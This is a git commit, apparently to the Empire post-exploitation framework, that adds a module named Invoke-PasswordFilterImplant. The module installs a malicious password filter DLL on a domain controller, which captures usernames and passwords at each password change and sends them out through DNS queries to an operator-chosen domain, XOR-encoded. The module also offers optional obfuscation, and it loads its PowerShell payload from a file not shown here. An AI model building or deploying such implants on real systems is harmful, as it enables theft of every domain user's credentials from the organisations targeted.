0803261b955a8f4a1f4b002757a4cf6c0f73433f
Le-non <leanne.dutil@gmail.com>
2018-04-26 10:53:03 -0400

    Added password filter implant module
    Added password filter implant module to exfiltrate usernames and passwords by DNS when a password change is made.

---
+++ lib/modules/powershell/exfiltration/Invoke-PasswordFilterImplant.py
@@ -0,0 +1,115 @@
+from lib.common import helpers
+import base64
+
+
+class Module:
+
+    def __init__(self, mainMenu, params=[]):
+
+        self.info = {
+		
+            'Name': 'Invoke-PasswordFilterImplant',
+
+
+            'Author': ['@Le-non', '@DorethZ10'],
+
+
+            'Description': ('Installs a malicious password filter on the DC that performs username and password exfiltration via DNS. The data is exfiltrated in the format requestnumber.data.domain.com. The data is the hex result of "username:password" XORed with the key.'),
+
+
+            'Background': False,
+
+
+            'OutputExtension': None,
+
+
+            'NeedsAdmin': True,
+
+
+            'OpsecSafe': False,
+
+
+            'Language': 'powershell',
+
+
+            'MinLanguageVersion': '2',
+
+        }
+
+
+        self.options = {
+
+		'Agent': {
+                'Description':   'Agent to run the module on.',
+                'Required'   :   True,
+                'Value'      :   ''
+            },
+ 		'KeyValue': {
+                'Description'   :   'Encrypting key for the passwords',
+                'Required'      :   True,
+                'Value'         :   '31337'
+            },
+        'DomainValue' : {
+                'Description'   :   'DNS Domain to exfill the data',
+                'Required'      :   True,
+                'Value'         :   'example.com'
+            },
+		'DllName' : {
+                'Description'   :   'File name of the password filter. (Excluding the ".dll" file extension)',
+                'Required'      :   True,
+                'Value'         :   'DLLPasswordFilterImplant'
+            },	
+		'DllPath' : {
+                'Description'   :   'Path to the System32 folder of the target',
+                'Required'      :   True,
+                'Value'         :   'C:\Windows\System32'
+            },	
+		'Cleanup' : {
+                'Description'   :   'Cleanup the trigger and any script from specified location.',
+                'Required'      :   False,
+                'Value'         :   ''
+            }
+        }
+
+        self.mainMenu = mainMenu
+
+        if params:
+            for param in params:
+                option, value = param
+                if option in self.options:
+                    self.options[option]['Value'] = value
+
+
+    def generate(self, obfuscate=False, obfuscationCommand=""):
+
+        moduleSource = self.mainMenu.installPath + "/data/module_source/exfil/Invoke-PasswordFilterImplant.ps1"
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
+        try:
+            f = open(moduleSource, 'r')
+        except:
+            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            return ""
+
+        moduleCode = f.read()
+        f.close()
+
+		script = moduleCode
+
+        # Need to actually run the module that has been loaded
+        scriptEnd = 'Invoke-PasswordFilterImplant'
+
+        # Add any arguments to the end execution of the script
+        for option, values in self.options.iteritems():
+            if option.lower() != "agent":
+                if values['Value'] and values['Value'] != '':
+                    if values['Value'].lower() == "true":
+                        # if we're just adding a switch
+                        scriptEnd += " -" + str(option)
+                    else:
+                        scriptEnd += " -" + str(option) + " \"" + str(values['Value']) + "\""
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
+        return script
